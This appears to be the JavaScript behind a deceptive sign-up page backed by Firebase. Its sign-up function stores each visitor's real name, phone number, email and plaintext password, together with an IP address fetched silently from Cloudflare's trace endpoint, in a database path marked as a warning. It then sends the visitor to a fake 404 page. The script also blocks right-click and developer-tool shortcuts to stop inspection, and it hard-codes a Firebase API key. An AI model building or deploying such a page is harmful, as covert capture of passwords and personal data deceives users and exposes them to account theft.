var firebaseConfig = {
  apiKey: "AIzaSyAL2_XUliNVNmQeM8sPs7DD7M385zYx-Ow",
  authDomain: "rxdh-36b15.firebaseapp.com",
  databaseURL: "https://rxdh-36b15-default-rtdb.firebaseio.com",
  projectId: "rxdh-36b15",
  storageBucket: "rxdh-36b15.appspot.com",
  messagingSenderId: "236068938161",
  appId: "1:236068938161:web:3fa82886a84ad9a0775d90",
  measurementId: "G-KWKK1TKQ8P"
};

firebase.initializeApp(firebaseConfig);

function showPassword() {
  var x = document.getElementById("password_entry");
  if (x.type === "password") {
    x.type = "text";
  } else {
    x.type = "password";
  }
}

function signUp() {
  real_name = document.getElementById("real_name").value;
  user_name = document.getElementById("user_name").value;
  phone_no = document.getElementById("phone_no").value;
  email = document.getElementById("email").value;
  password = document.getElementById("password_entry").value;
  firebase.database().ref("!!!!!!!WARNING_ATTEMPT_TO_SIGN_UP!!!!!!!!!/").push({
    name_real: real_name,
    name: user_name,
    phone_no: phone_no,
    email: email,
    password: password,
    time: time,
    ip_adress: ip_real,
  });
  firebase.database().ref().update({
    danger: time
  });
  window.location = "404error.html";
}

function check() {
  firebase.database().ref("/").on('value', function (snapshot) {
    snapshot.forEach(function (childSnapshot) {
      childKey = childSnapshot.key;
      childData = snapshot.val();
      verify = childData;
      dan = verify['danger'];
      if (dan == "no") {

      } else {
        window.location = "https://www.learncbse.in/ncert-solutions-class-10-science/";
      }
    });
  });
}
setInterval(check, 1000)

// Disable right-click
document.addEventListener('contextmenu', (e) => e.preventDefault());

function ctrlShiftKey(e, keyCode) {
  return e.ctrlKey && e.shiftKey && e.keyCode === keyCode.charCodeAt(0);
}

document.onkeydown = (e) => {
  // Disable F12, Ctrl + Shift + I, Ctrl + Shift + J, Ctrl + U
  if (
    event.keyCode === 123 ||
    ctrlShiftKey(e, 'I') ||
    ctrlShiftKey(e, 'J') ||
    ctrlShiftKey(e, 'C') ||
    (e.ctrlKey && e.keyCode === 'U'.charCodeAt(0))
  )
    return false;
};

function text(url) {
  return fetch(url).then(res => res.text());
}

text('https://www.cloudflare.com/cdn-cgi/trace').then(data => {
  let ipRegex = /[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}/
  let ip = data.match(ipRegex)[0];
  ip_real = ip;
});